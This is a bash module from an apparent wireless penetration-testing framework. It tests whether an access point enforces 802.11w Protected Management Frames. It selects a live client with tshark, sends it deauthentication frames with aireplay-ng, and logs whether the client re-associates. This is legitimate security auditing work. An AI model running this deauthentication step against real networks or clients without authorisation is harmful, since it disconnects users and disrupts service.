#!/usr/bin/env bash
# MODULE_META
# NAME="PMF Enforcement"
# CATEGORY="H"
# DEPS="A1"
# CRITICAL="yes"
# TOOLS="aireplay-ng,tshark"
# DESC="Verify if 802.11w Protected Management Frames are enforced"
# REQS="monitor_iface,target_ssid,target_bssid,target_channel"
# PCAP="no"
# DECODE="none"

#===============================================================================
#  modules/h2_pmf_check.sh
#  H2: PMF (Protected Management Frames) Enforcement Check
#
#  PURPOSE:
#    Test if the AP correctly enforces 802.11w (PMF). If an AP claims PMF is
#    required, it should ignore unencrypted deauthentication/disassociation 
#    frames. This module tests for misconfigurations where PMF is "enabled" 
#    but not actually "enforced".
#===============================================================================

run_h2() {
    set -uo pipefail
    local total_steps=5
    local evidence_prefix="${SESSION_EVIDENCE_DIR}/h2"
    
    log_step 1 $total_steps "Detecting PMF Support"
    update_tc_progress 1 $total_steps "Detection"

    check_module_dependencies "H2" || return 1

    check_abort || return 1

    if [[ -z "${GUEST_SSID:-}" ]]; then
        log_error "Target SSID not set. Run A1 first."; return 1
    fi

    # Check scan results for RSN PMF flags
    local pmf_supported="false"
    if has_tc_results "A1"; then
        local a1_data=$(load_tc_result "A1")
        if echo "$a1_data" | grep -qi "PMF"; then
            pmf_supported="true"
            log_info "PMF (802.11w) detected in AP beacon RSN info."
        fi
    fi

    log_step 2 $total_steps "Enabling Monitor Mode"
    enable_monitor_mode || return 1
    local mon_iface="${MONITOR_INTERFACE}"

    check_abort || return 1

    log_step 3 $total_steps "Selecting Target Client"
    # Try to find an active client on the target AP
    local target_client=$(run_as_user tshark -i "$mon_iface" -a duration:10 -Y "wlan.bssid == ${GUEST_BSSID}" -T fields -e wlan.sa 2>/dev/null | sort | uniq | head -1)
    
    if [[ -z "$target_client" ]]; then
        log_warn "No active clients detected on ${GUEST_SSID}. Cannot test PMF enforcement."
        return 1
    fi
    log_info "Target Client: ${target_client}"

    log_step 4 $total_steps "Attempting Unprotected Deauth"
    update_tc_progress 4 $total_steps "Attack Test"

    check_abort || return 1

    local log_file="${evidence_prefix}_deauth_test.txt"
    log_info "Sending 10 deauth frames to ${target_client}..."
    
    # Send deauths
    run_fg "aireplay-ng" --deauth 10 -a "${GUEST_BSSID}" -c "${target_client}" "${mon_iface}" > "$log_file" 2>&1
    
    # Check if client reconnects immediately (indicator of success)
    log_info "Monitoring for client re-association..."
    local reauth=$(timeout 15 run_as_user tshark -i "$mon_iface" -Y "wlan.fc.type_subtype == 0x00 and wlan.addr == ${target_client}" -c 1 2>/dev/null)
    
    local vulnerability="SECURE"
    if [[ -n "$reauth" ]]; then
        log_result "FINDING" "PMF BYPASSED: Client responded to unprotected deauth."
        vulnerability="VULNERABLE"
    else
        log_success "PMF ENFORCED: Client ignored unprotected deauth."
    fi

    log_step 5 $total_steps "Saving Results"
    local result_json=$(run_tool jq -n \
        --arg status "$vulnerability" \
        --arg summary "PMF Enforcement: ${vulnerability}" \
        --arg details "AP: ${GUEST_BSSID}, Client: ${target_client}" \
        '{
            status: $status,
            summary: $summary,
            details: $details
        }')
    
    local has_tool_output=0
    [[ -f "$log_file" ]] && has_tool_output=1
    local is_secure_claim=0
    [[ "$vulnerability" == "SECURE" ]] && is_secure_claim=1

    save_tc_result "H2" "$result_json" 1 $has_tool_output 1 1 1 1 0 1 1 1 $is_secure_claim
    save_session_state
    return 0
}
